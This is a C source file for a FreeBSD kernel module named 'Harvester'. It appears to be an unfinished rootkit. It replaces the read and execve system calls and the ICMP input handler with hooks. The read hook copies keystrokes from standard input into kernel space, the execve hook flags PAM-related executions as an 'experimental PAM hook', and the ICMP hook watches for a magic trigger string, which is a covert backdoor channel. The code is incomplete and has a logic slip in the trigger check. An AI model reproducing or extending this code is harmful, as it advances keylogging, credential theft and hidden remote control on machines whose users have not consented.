/*
 * Name:
 *      Harvester
 * Description:
 *      A system call module that gather information about the target host
 * Usage:
 *      TODO: Add usage here
 * Author:
 *      Hai Lang
 * Date Created:
 *      2013-02-28
 * Last Update:
 *      2013-02-28
 *
 * TODO:
*/

/* General Headers */
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/sysproto.h>

/* System Call Headers */
#include <sys/syscall.h>
#include <sys/stat.h>

/* File Handling Headers */
//#include <sys/fcntl.h>
//#include <sys/file.h>
//#include <sys/syslog.h>

/* Headers For ICMP Hooking */
#include <sys/mbuf.h>
#include <sys/protosw.h>
//#include <net/if.h>
#include <netinet/in.h>
#include <netinet/in_pcb.h>
#include <netinet/ip_var.h>
#include <netinet/tcp_var.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

/* Options */
#define KERNDEBUG 1
#define ICMP_TRIGGER "5L1C3R_TRIGGER"

/* For ICMP Hooking */
extern struct protosw inetsw[];
pr_input_t icmp_input_hook;

/* Harvester Implementation Function */
static int harvester(struct thread *td, void *syscall_args)
{
    uprintf("Harvester Module Loaded!\n");
    return (0);
}

/* icmp_input_hook - Reporting */
void icmp_input_hook(struct mbuf *m, int off)
{
    struct icmp *icp;
    int hlen = off;

    /* Locate the ICMP message within m */
    m->m_len -= hlen;
    m->m_data += hlen;

    /* Extract the ICMP message */
    icp = mtod(m, struct icmp *);

    /* Restore the message */
    m->m_len += hlen;
    m->m_data -= hlen;

    /* Check if the message has the right trigger */
    printf("Data Received: %s\n", icp->icmp_data);
    if(strcmp(icp->icmp_data, ICMP_TRIGGER)) {
        printf("ICMP Trigger Received!\n");
    } else {
        icmp_input(m, off);
    }
}

/* read hook - get user input */
static int read_hook(struct thread *td, void *syscall_args)
{
    struct read_args /*{
        int fd; //object reference descriptor
        void *buf; //results will be saved here
        size_t nbyte; //size to read
    }*/ *args;
    args = (struct read_args *)syscall_args;

    int error;
    char buf[1]; //read 1 character at a time
    size_t copied;

    error = sys_read(td, syscall_args);
    if (error || (!args->nbyte) /*|| (args->nbyte > 1)*/ || (args->fd != 0)) {
        //if error reading,
        //or no byte were read
        //or more than one character were read
        //or the input is not from stardard input (d = 0)
        return (error);
    }

    /* Otherwise, copy the buf to the kernel space */
    copyinstr(args->buf, buf, 1, &copied);
    //printf("%c\n", buf[0]);

    return (error);
}

/* Experimental PAM Hook */
static int execve_hook(struct thread *td, void *syscall_args)
{
    struct execve_args /*{
        const char *path;
        char *const argv[];
        char *const envp[];
    }*/*args;
    args = (struct execve_args *)syscall_args;

    char path[NAME_MAX];
    size_t copied;
    if (copyinstr(args->fname, path, NAME_MAX, &copied) == EFAULT) {
        return (EFAULT);
    }

    if(strstr(path, "pam")) {
        uprintf("FOUND: %s\n", path);
    }

    return (sys_execve(td, syscall_args));
}
/*
 * ================System Call Config===================
 * =====================================================
*/
/* Prepare sysent to register the new system call */
static struct sysent harvester_sysent = {
    1, /* Number of arguments */
    harvester /* Implementation Function */
};

/* Define the offset in sysent[] table */
static int offset = NO_SYSCALL;

/* Event Handler Function For The New System Call */
static int load(struct module *module, int cmd, void *arg)
{
    int error = 0;

    switch(cmd) {
        case MOD_LOAD:
            #if KERNDEBUG == 1
            uprintf("Harvester Module Loaded!\n");
            #endif
            sysent[SYS_read].sy_call = (sy_call_t *)read_hook;
            sysent[SYS_execve].sy_call = (sy_call_t *)execve_hook;
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input_hook;
            break;
        case MOD_UNLOAD:
            #if KERNDEBUG == 1
            uprintf("Harvester Module Unloaded\n");
            #endif
            sysent[SYS_read].sy_call = (sy_call_t *)sys_read;
            sysent[SYS_execve].sy_call = (sy_call_t *)sys_execve;
            inetsw[ip_protox[IPPROTO_ICMP]].pr_input = icmp_input;
            break;
        default:
            error = EOPNOTSUPP;
            break;
    }

    return (error);
}

/* Declare and register the system call module */
SYSCALL_MODULE(harvester, &offset, &harvester_sysent, load, NULL);
